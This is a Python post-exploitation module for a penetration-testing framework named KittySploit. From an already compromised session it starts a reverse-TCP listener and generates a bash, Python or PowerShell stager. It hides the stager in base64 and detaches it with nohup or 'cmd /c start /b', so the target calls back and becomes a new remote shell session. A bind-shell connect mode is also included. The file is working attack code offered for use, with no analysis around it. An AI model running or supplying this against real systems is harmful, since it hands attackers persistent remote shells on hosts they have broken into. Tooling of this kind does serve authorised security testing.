#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Spawn a second interactive shell session (reverse TCP) from an existing session.
Starts a local listener, runs the appropriate one-liner on the target, registers
the inbound connection as a new shell session in this framework.
"""

from kittysploit import *
from lib.exploit.handler import Reverse
from core.framework.enums import Platform, SessionType
from core.framework.failure import ProcedureError, FailureType

import base64
import importlib
import shlex
import socket
import threading
import time


class Module(Post, Reverse):
    __info__ = {
        "name": "Spawn Reverse Shell Session",
        "description": (
            "From the current session, open a reverse TCP listener (lhost:lport) and run a "
            "platform-appropriate one-liner so the target connects back; the new socket is "
            "registered as a separate shell session."
        ),
        "platform": Platform.MULTI,
        "author": "KittySploit Team",
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [],
    }

    target = OptChoice(
        "auto",
        "Target OS for payload choice: auto (from session), linux, windows",
        True,
        choices=["auto", "linux", "windows"],
    )
    payload = OptChoice(
        "auto",
        "Stager: auto (bash on linux, PowerShell on windows), bash, python, powershell",
        False,
        choices=["auto", "bash", "python", "powershell"],
    )
    wait_seconds = OptInteger(5, "Seconds to wait after firing the stager for the callback (increase on slow links)", False)
    bind_rhost = OptString("","Optional: connect to an existing bind shell at this host (no reverse listener)", False, advanced=True)
    bind_rport = OptPort(4444, "Port for bind_rhost when using bind mode", False, advanced=True)

    def check(self):
        sid = self.session_id.value if hasattr(self.session_id, "value") else str(self.session_id)
        if not sid or not str(sid).strip():
            return False
        if self.framework and hasattr(self.framework, "session_manager"):
            if not self.framework.session_manager.get_session(str(sid).strip()):
                return False
        bind_host = (self.bind_rhost.value if hasattr(self.bind_rhost, "value") else str(self.bind_rhost) or "").strip()
        if bind_host:
            return True
        lhost_val = (self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost) or "").strip()
        if not lhost_val:
            return False
        return True

    def _session_platform_hint(self) -> str:
        """Return 'linux', 'windows', or 'linux' as default."""
        sid = self.session_id.value if hasattr(self.session_id, "value") else str(self.session_id)
        if not self.framework or not hasattr(self.framework, "session_manager"):
            return "linux"
        session = self.framework.session_manager.get_session(str(sid).strip())
        if not session:
            return "linux"
        st = (getattr(session, "session_type", "") or "").lower()
        data = getattr(session, "data", None) or {}
        if isinstance(data, dict):
            plat = (data.get("platform") or "").lower()
            if "win" in plat:
                return "windows"
        if "windows" in st or st == "meterpreter" and "win" in str(data).lower():
            return "windows"
        return "linux"

    def _effective_target(self) -> str:
        t = self.target.value if hasattr(self.target, "value") else str(self.target)
        t = (t or "auto").lower()
        if t == "auto":
            return self._session_platform_hint()
        return t

    def _effective_payload(self, target_os: str) -> str:
        p = self.payload.value if hasattr(self.payload, "value") else str(self.payload)
        p = (p or "auto").lower()
        if p != "auto":
            return p
        return "powershell" if target_os == "windows" else "bash"

    def _load_payload_module(self, import_path: str):
        mod = importlib.import_module(import_path)
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.Unknown, f"No Module class in {import_path}")
        return cls(framework=self.framework)

    def _generate_stager(self, target_os: str, payload_kind: str, lhost_val: str, lport_val: int) -> str:
        if target_os == "windows":
            if payload_kind not in ("auto", "powershell"):
                print_warning("Windows target: forcing powershell reverse stager")
            pl = self._load_payload_module("modules.payloads.singles.cmd.windows.powershell_reverse_tcp")
            pl.set_option("lhost", lhost_val)
            pl.set_option("lport", str(lport_val))
            out = pl.generate()
            if not out or not isinstance(out, str):
                raise ProcedureError(FailureType.Unknown, "PowerShell payload did not return a command string")
            return out.strip()

        # Linux / Unix-style
        if payload_kind == "python":
            mod_path = "modules.payloads.singles.cmd.unix.python_reverse_tcp"
            pl = self._load_payload_module(mod_path)
            pl.set_option("lhost", lhost_val)
            pl.set_option("lport", str(lport_val))
            out = pl.generate()
            if not out or not isinstance(out, str):
                raise ProcedureError(FailureType.Unknown, "Python payload did not return a command string")
            return out.strip()

        # bash (default) or sh
        mod_path = "modules.payloads.singles.cmd.unix.bash_reverse_tcp"
        pl = self._load_payload_module(mod_path)
        pl.set_option("lhost", lhost_val)
        pl.set_option("lport", str(lport_val))
        pl.set_option("shell_binary", "bash")
        out = pl.generate()
        if not out or not isinstance(out, str):
            raise ProcedureError(FailureType.Unknown, "Bash payload did not return a command string")
        return out.strip()

    def _wrap_linux_background(self, inner: str) -> str:
        """Run inner shell command in background without blocking the channel."""
        b64 = base64.b64encode(inner.encode("utf-8")).decode("ascii")
        core = f"echo {b64} | base64 -d | /bin/sh"
        return f"nohup /bin/sh -c {shlex.quote(core)} >/dev/null 2>&1 &"

    def _wrap_windows_background(self, inner: str) -> str:
        """Detach stager from the current session's foreground where possible."""
        escaped = inner.replace('"', '\\"')
        return f'cmd /c start /b "" cmd /c "{escaped}"'

    def _connect_bind_shell(self, rhost: str, rport: int) -> bool:
        print_info(f"Connecting to bind shell at {rhost}:{rport}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15.0)
            sock.connect((rhost, int(rport)))
        except Exception as e:
            print_error(f"Bind connect failed: {e}")
            return False

        session_data = {
            "connection": sock,
            "address": (rhost, int(rport)),
            "connection_time": time.time(),
            "protocol": "tcp",
            "handler": "bind",
            "connection_type": "bind",
        }
        session_id = self._create_session(rhost, int(rport), "shell", session_data)
        if session_id:
            print_success(f"Bind shell session created: {session_id}")
            if self.framework and hasattr(self.framework, "session_manager"):
                session = self.framework.session_manager.get_session(session_id)
                if session and session.data is not None:
                    session.data["socket"] = sock
            return True
        try:
            sock.close()
        except Exception:
            pass
        return False

    def run(self):
        bind_host = (self.bind_rhost.value if hasattr(self.bind_rhost, "value") else str(self.bind_rhost) or "").strip()
        if bind_host:
            bind_port = int(self.bind_rport.value) if hasattr(self.bind_rport, "value") else int(self.bind_rport)
            return self._connect_bind_shell(bind_host, bind_port)

        lhost_val = str(self.lhost.value if hasattr(self.lhost, "value") else self.lhost).strip()
        lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)
        if not lhost_val:
            print_error("lhost is required (IP or hostname the compromised host can reach for the callback)")
            return False

        tgt = self._effective_target()
        pkind = self._effective_payload(tgt)
        wait_s = int(self.wait_seconds.value if hasattr(self.wait_seconds, "value") else self.wait_seconds)

        print_status(f"Target profile: {tgt}, stager: {pkind}, callback {lhost_val}:{lport_val}")

        if not self.start_handler():
            print_error("Could not start reverse TCP listener")
            return False

        time.sleep(1.0)

        try:
            stager = self._generate_stager(tgt, pkind, lhost_val, lport_val)
        except ProcedureError as e:
            print_error(str(e))
            self.stop_handler()
            return False
        except Exception as e:
            print_error(f"Payload generation failed: {e}")
            self.stop_handler()
            return False

        if tgt == "windows":
            remote_cmd = self._wrap_windows_background(stager)
        else:
            remote_cmd = self._wrap_linux_background(stager)

        print_info("Sending stager on the current session (background)...")

        def _fire():
            try:
                self.cmd_execute(remote_cmd)
            except Exception as ex:
                print_warning(f"Stager thread reported: {ex}")

        threading.Thread(target=_fire, daemon=True).start()
        print_success("Stager dispatched")
        print_info(f"Waiting up to {wait_s}s for callback on {lhost_val}:{lport_val}...")
        time.sleep(max(1, wait_s))

        print_info("If a new session appeared, use 'sessions' to interact with it. Listener stays open for more callbacks; exit the module or restart framework to stop it.")
        return True
